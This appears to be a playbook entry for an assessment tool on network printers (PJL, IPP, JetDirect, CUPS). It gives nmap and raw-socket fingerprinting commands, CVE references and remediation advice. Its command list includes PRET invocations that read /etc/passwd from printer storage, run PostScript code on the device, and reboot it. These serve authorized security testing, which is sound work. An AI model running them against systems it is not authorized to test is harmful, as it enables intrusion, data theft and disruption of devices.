---
id: ipp_pjl
technology: "Network printers (IPP/PJL/JetDirect)"
domain: IoT
safety_class: safe
severity: high
life_safety: false
match:
  ports: [9100, 631]
  banners: ["jetdirect", "hp laserjet", "pjl", "ipp/", "cups", "brother", "xerox", "ricoh", "konica"]
  markers: ["/ipp/print", "/printers/", "application/ipp", "@PJL", "READY ONLINE"]
quick_wins:
  - { cmd: "nmap -sV -p 9100,631 --script pjl-ready-message,ipp-printers {host}", safety: safe, note: "Fingerprint PJL device status and enumerate IPP printer queue names" }
  - { cmd: "python3 -c \"import socket; s=socket.create_connection(('{host}',9100)); s.sendall(b'\\x1b%-12345X@PJL INFO ID\\r\\n\\x1b%-12345X\\r\\n'); print(s.recv(1024).decode(errors='replace')); s.close()\"", safety: safe, note: "Read PJL INFO ID to obtain exact make/model string without authentication" }
  - { cmd: "nmap -p 631 --script ipp-printers,ipp-queue-status {host}", safety: safe, note: "List IPP printer attributes, queues, and job history via RFC 8011 Get-Printer-Attributes" }
  - { cmd: "curl -s http://{host}:631/printers/ -H 'Accept: text/html'", safety: safe, note: "Retrieve CUPS printer list from the embedded web admin interface" }
  - { cmd: "python3 pret.py {host} pjl -i 'ls /'", safety: intrusive, note: "PRET filesystem enumeration via PJL — reads directory listings from printer flash/disk (requires pret.py from github.com/RUB-NDS/PRET)" }
  - { cmd: "python3 pret.py {host} pjl -i 'get /etc/passwd'", safety: intrusive, note: "PRET file read — pull arbitrary files from printer filesystem; confirms unauthenticated FS access" }
  - { cmd: "python3 pret.py {host} ps -i 'systemdict /disableaccess known { disableaccess } if (cat /etc/passwd) == flush'", safety: intrusive, note: "PostScript interpreter shell — executes PS code on device; used to confirm RCE surface on PS-capable printers" }
  - { cmd: "python3 pret.py {host} pjl -i 'reset'", safety: disruptive, note: "PJL RESET command — reboots the printer and clears the job queue; only run with explicit client approval" }
references:
  - "CVE-2022-3942"
  - "CVE-2021-39238"
  - "CVE-2021-39237"
  - "CVE-2017-2750"
  - "CVE-2014-3741"
  - "ICSA-21-287-01"
  - "CISA KEV - HP Printer RCE (CVE-2021-39238)"
mitre: "T0852"
---
# Network Printers (IPP/PJL/JetDirect) guidance

Network-attached printers expose one or more management planes: port 9100/TCP (JetDirect raw printing plus PJL command injection), port 631/TCP (IPP — Internet Printing Protocol, typically CUPS or vendor stack), and an optional embedded HTTP admin GUI. PJL (Printer Job Language) was designed for out-of-band device management but has no authentication by default, allowing unauthenticated reads of device identity, filesystem trees, NVRAM, and — on writable devices — arbitrary file upload. IPP carries similar risks when deployed without TLS or client certificates.

During an authorized engagement, start read-only: pull the PJL INFO ID string and enumerate IPP queue attributes with nmap NSE scripts before touching any active tool. The model string alone frequently maps to known CVEs (e.g., HP FutureSmart RCE chain CVE-2021-39238, HP OfficeJet buffer overflow CVE-2022-3942). CUPS installations (port 631) should be checked for the 2024 critical RCE chain (CVE-2024-47176 / CVE-2024-47076 / CVE-2024-47175 / CVE-2024-47177) where an unauthenticated attacker can deliver a malicious IPP URL that triggers command execution when any user initiates a print job.

PRET (Printer Exploitation Toolkit, github.com/RUB-NDS/PRET) is the standard tool for deeper assessment; mark its filesystem read commands intrusive and its write/reset commands disruptive — gate both behind explicit scope confirmation. PostScript and PCL interpreters on high-end devices can execute code delivered inside a crafted print job, making printers a persistent pivot point inside the corporate network with access to document streams containing sensitive data.

Remediation: restrict 9100/TCP and 631/TCP to authorized print servers via firewall ACLs, enable IPP over TLS (ipps://), disable PJL filesystem commands in firmware settings, apply vendor firmware patches, and place printers on an isolated VLAN with no direct internet egress. For CUPS servers, update to 2.4.11+ or apply distribution patches addressing the 2024 UDP/631 RCE chain.
